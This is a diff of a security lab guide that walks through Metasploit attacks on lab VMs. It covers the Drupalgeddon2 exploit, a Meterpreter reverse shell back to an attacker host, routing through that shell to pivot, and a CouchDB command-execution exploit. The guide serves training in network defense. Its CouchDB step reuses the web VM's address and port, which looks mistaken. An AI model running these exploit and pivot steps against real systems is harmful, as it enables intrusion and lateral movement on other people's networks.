@@ -478,10 +478,6 @@ RHOST => 192.168.10.101
 msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set RPORT 8080
 RPORT => 8080
 msf5 exploit(unix/webapp/drupal_drupalgeddon2) > exploit
-[*] Started reverse TCP handler on 10.114.209.151:4444
-[*] Sending stage (38288 bytes) to 192.168.10.101
-[*] Meterpreter session 1 opened (10.114.209.151:4444 -> 192.168.10.101:45032) at 2020-07-20 19:37:29 -0500
-
 ```
 3. If you want to go with the script option instead, run **sudo nano attack1.rc** and type **VMware1!** when asked for the password. 
     * Confirm that the **RHOST** line IP address matches with the IP address of **App1-WEB-TIER VM** you saw in the NSX VM Inventory. 
@@ -492,37 +488,9 @@ msf5 exploit(unix/webapp/drupal_drupalgeddon2) > exploit
 5. Confirm the vulnerable server was sucessfully exploited and a **Meterpreter** reverse TCP session was established from **App1-WEB-TIER VM** back to the **Extermal VM**
 
 ```console
-vmware@ubuntu:~$ ./attack1.sh
-
-IIIIII    dTb.dTb        _.---._
-  II     4'  v  'B   .'"".'/|\`.""'.
-  II     6.     .P  :  .' / | \ `.  :
-  II     'T;. .;P'  '.'  /  |  \  `.'
-  II      'T; ;P'    `. /   |   \ .'
-IIIIII     'YvP'       `-.__|__.-'
-
-I love shells --egypt
-
-
-       =[ metasploit v5.0.95-dev                          ]
-+ -- --=[ 2038 exploits - 1103 auxiliary - 344 post       ]
-+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
-+ -- --=[ 7 evasion                                       ]
-
-Metasploit tip: Tired of setting RHOSTS for modules? Try globally setting it with setg RHOSTS x.x.x.x
-
-[*] Processing attack1.rc for ERB directives.
-resource (attack1.rc)> use exploit/unix/webapp/drupal_drupalgeddon2
-[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
-resource (attack1.rc)> set RHOST 192.168.10.100
-RHOST => 192.168.10.101
-resource (attack1.rc)> set RPORT 8080
-RPORT => 8080
-resource (attack1.rc)> exploit
 [*] Started reverse TCP handler on 10.114.209.151:4444
 [*] Sending stage (38288 bytes) to 192.168.10.101
 [*] Meterpreter session 1 opened (10.114.209.151:4444 -> 192.168.10.101:45032) at 2020-07-20 19:37:29 -0500
-
 ```
 6. **Optionally**, you can now interact with the Meterpreter session. For instance, you can run the below commands to gain more inforation on the exploited **App1-WEB-TIER VM**
     * Type **sysinfo** to learn more about the running OS
@@ -570,6 +538,8 @@ You have now successfully completed a simple attack scenario ! In the next exerc
 
 In this exercise, we will use already established **reverse shell** from the Drupal servers as a **pivot** to gain access to the internal network which is not direclty accessible from the external VM. Traffic to the internal network will be routed through the established **reverse shell** from the **App1-WEB-TIER VM**. 
 
+In order to launch this attakc sequence, you can either manually configure the **Metasploit** modules, or edit and run a pre-defined script. If you want to go with the script option, skip to step #3 and continue from there. 
+
 **Initiate DrupalGeddon2 attack against App1-WEB-TIER VM (again)**
 1.	If you have previously existed the SSH or Console session, restart the SSH or Console session with the  **External VM** 
 2. If you have previously exited Metasploit, type **sudo msfconsole** to launch **Metasploit**. Follow the below steps to initiate the exploit. Hit **enter** between every step. 
@@ -595,37 +565,19 @@ msf5 exploit(unix/webapp/drupal_drupalgeddon2) >
 ```
     
 **Route traffic to the Internal Network through the esablished reverse shell**
-1.	Type **route add 192.168.20.0/24 1**, where the subnet specified is the subnet of the **Internal Segment**
-
+1.	Once the Meterpreter session is established and backgrounded, type **route add 192.168.20.0/24 1**, where the subnet specified is the subnet of the **Internal Segment**
 ```console
 msf5 exploit(unix/webapp/drupal_drupalgeddon2) > route add 192.168.20.0/24 1
 [*] Route added
 ```
-2.	Follow the below steps to run a portscan to discover any running services on the **DMZ** and **Internal** Segments.
-    * Type **use auxiliary/scanner/portscan/tcp** to select the portscan module
-    * Type **set THREADS 50** 
-    * Type **set RHOSTS 192.168.10.0/24, 192.168.20.0/24** to define the subnets to scan. These should match the **DMZ** and **Internal** Subnets
-    * Type **set PORTS 8080,5984** to define the ports to scan (Drupal and CouchDB servers)
-    * Type **run
+2.	Now that we have instructed Metapsloit to route traffic to the internal subnet through the reverse shell, we can pivot the attack and attack the **App1-APP-TIER VM** on the internal network, which is running a vulnerable **CouchDB** Service. 
 
-```console
-msf5 auxiliary(scanner/portscan/tcp) > use auxiliary/scanner/portscan/tcp
-msf5 auxiliary(scanner/portscan/tcp) > set THREADS 50
-THREADS => 50
-msf5 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.10.0/24, 192.168.20.0/24
-RHOSTS => 192.168.10.0/24, 192.168.20.0/24
-msf5 auxiliary(scanner/portscan/tcp) > set PORTS 8080,5984
-PORTS => 8080,5984
-msf5 auxiliary(scanner/portscan/tcp) > run
-
-```
-
-3.	It may take a while for the scan to complete, but you should see the below results when it does:
-
-```console
-msf5 exploit(unix/webapp/drupal_drupalgeddon2) > route add 192.168.20.0/24 1
-[*] Route added
-```
+**Initiate CouchDB Commnad Execution attack against App1-APP-TIER VM**
+1.	Using the already open Metasploit console, follow the below steps to initiate the exploit. Hit **enter** between every step. 
+    * Type **use exploit/linux/http/apache_couchdb_cmd_exec** to select the CouchDB Command Execution exploit module
+    * Type **set RHOST 192.168.10.101** to define the IP address of the victim to attack. The IP address should match the IP address of **App1-WEB-TIER VM**
+    * Type **set RPORT 8080** to define the port the vulnerable Drupal service runs on. 
+    * Type **exploit -z** to initiate the exploit, esbalish a reverse shell, and background the session.
 
 
 
